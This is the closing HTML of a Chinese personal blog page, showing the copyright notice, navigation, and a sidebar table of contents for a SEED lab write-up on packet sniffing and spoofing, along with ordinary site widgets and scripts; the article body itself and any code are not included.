</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Enboy_Yu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://02lxc.github.io/post/4f4694a6.html">https://02lxc.github.io/post/4f4694a6.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://02lxc.github.io" target="_blank">Enboy_Yu's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/seedlab-%E5%97%85%E6%8E%A2%E6%94%BB%E5%87%BB/">seedlab 嗅探攻击</a></div><div class="post_share"><div class="social-share" data-image="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/d8a78989.html"><img class="prev-cover" src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SEEDLAB：TCP/IP Attack实验</div></div></a></div><div class="next-post pull-right"><a href="/post/50860de4.html"><img class="next-cover" src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SEEDLAB：SQL注入攻击实验</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Enboy_Yu</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="xpand" style="height:200px;"><canvas class="illo" width="800" height="800" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;"></canvas></div><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople1.js"></script><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/zdog.dist.js"></script><script id="rendered-js" src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople.js"></script><style>.card-widget.card-announcement {
margin: 0;
align-items: center;
justify-content: center;
text-align: center;
}
canvas {
display: block;
margin: 0 auto;
cursor: move;
}</style><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">一、    实验目的</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-overview"><span class="toc-number">1.1.</span> <span class="toc-text">1 overview</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4%E5%8F%8A%E7%BB%93%E6%9E%9C"><span class="toc-number">2.</span> <span class="toc-text">二、    实验步骤及结果</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Environment-Setup-using-Container"><span class="toc-number">2.1.</span> <span class="toc-text">2 Environment Setup using Container</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-Container-Setup-and-Commands"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1 Container Setup and Commands</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-About-the-Attacker-Container"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.2 About the Attacker Container</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets"><span class="toc-number">2.2.</span> <span class="toc-text">3 Lab Task Set 1: Using Scapy to Sniff and Spoof Packets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Task-1-1-Sniffifing-Packets"><span class="toc-number">2.2.1.</span> <span class="toc-text">3.1: Task 1.1: Sniffifing Packets</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-1-1A"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">Task 1.1A</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-1-1B"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">Task 1.1B</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Task-1-2-Spoofifing-ICMP-Packets"><span class="toc-number">2.2.2.</span> <span class="toc-text">3.2 Task 1.2: Spoofifing ICMP Packets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-Task-1-3-Traceroute"><span class="toc-number">2.2.3.</span> <span class="toc-text">3.3 Task 1.3: Traceroute</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.2.3.1.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-Task-1-4-Sniffifing-and-then-Spoofifing"><span class="toc-number">2.2.4.</span> <span class="toc-text">3.4 Task 1.4: Sniffifing and-then Spoofifing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets"><span class="toc-number">2.3.</span> <span class="toc-text">4 Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-Task-2-1-Writing-Packet-Sniffifing-Program"><span class="toc-number">2.3.1.</span> <span class="toc-text">4.1 Task 2.1: Writing Packet Sniffifing Program</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-2-1A-Understanding-How-a-Sniffer-Works"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">**Task 2.1A: Understanding How a Sniffer Works **</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-2-1B-Writing-Filters"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">Task 2.1B: Writing Filters</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-2-1C-Sniffifing-Passwords"><span class="toc-number">2.3.1.3.</span> <span class="toc-text">Task 2.1C: Sniffifing Passwords</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-Task-2-2-Spoofifing"><span class="toc-number">2.3.2.</span> <span class="toc-text">4.2 Task 2.2: Spoofifing</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-2-2A-Write-a-spoofifing-program"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">Task 2.2A: Write a spoofifing program.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-2-2B-Spoof-an-ICMP-Echo-Request"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">Task 2.2B: Spoof an ICMP Echo Request</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-Task-2-3-Sniff-and-then-Spoof"><span class="toc-number">2.3.3.</span> <span class="toc-text">4.3 Task 2.3: Sniff and then Spoof</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">2.3.4.</span> <span class="toc-text"></span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/88a94389.html" title="SEEDLAB：缓存攻击实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：缓存攻击实验"/></a><div class="content"><a class="title" href="/post/88a94389.html" title="SEEDLAB：缓存攻击实验">SEEDLAB：缓存攻击实验</a><time datetime="2024-01-31T08:48:54.810Z" title="发表于 2024-01-31 16:48:54">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/82027ba8.html" title="SEEDLAB：MD5碰撞实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：MD5碰撞实验"/></a><div class="content"><a class="title" href="/post/82027ba8.html" title="SEEDLAB：MD5碰撞实验">SEEDLAB：MD5碰撞实验</a><time datetime="2024-01-31T08:46:53.792Z" title="发表于 2024-01-31 16:46:53">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/f52b3abf.html" title="SEEDLAB：幽灵攻击实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：幽灵攻击实验"/></a><div class="content"><a class="title" href="/post/f52b3abf.html" title="SEEDLAB：幽灵攻击实验">SEEDLAB：幽灵攻击实验</a><time datetime="2024-01-31T06:12:11.281Z" title="发表于 2024-01-31 14:12:11">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/4aa986b5.html" title="SEEDLAB：DNS欺骗实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：DNS欺骗实验"/></a><div class="content"><a class="title" href="/post/4aa986b5.html" title="SEEDLAB：DNS欺骗实验">SEEDLAB：DNS欺骗实验</a><time datetime="2024-01-31T06:11:38.662Z" title="发表于 2024-01-31 14:11:38">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/d8a78989.html" title="SEEDLAB：TCP/IP Attack实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：TCP/IP Attack实验"/></a><div class="content"><a class="title" href="/post/d8a78989.html" title="SEEDLAB：TCP/IP Attack实验">SEEDLAB：TCP/IP Attack实验</a><time datetime="2024-01-31T06:11:16.140Z" title="发表于 2024-01-31 14:11:16">2024-01-31</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Enboy_Yu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async src="https://npm.elemecdn.com/tzy-blog/lib/js/other/sakura.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":20,"vOffset":-20},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>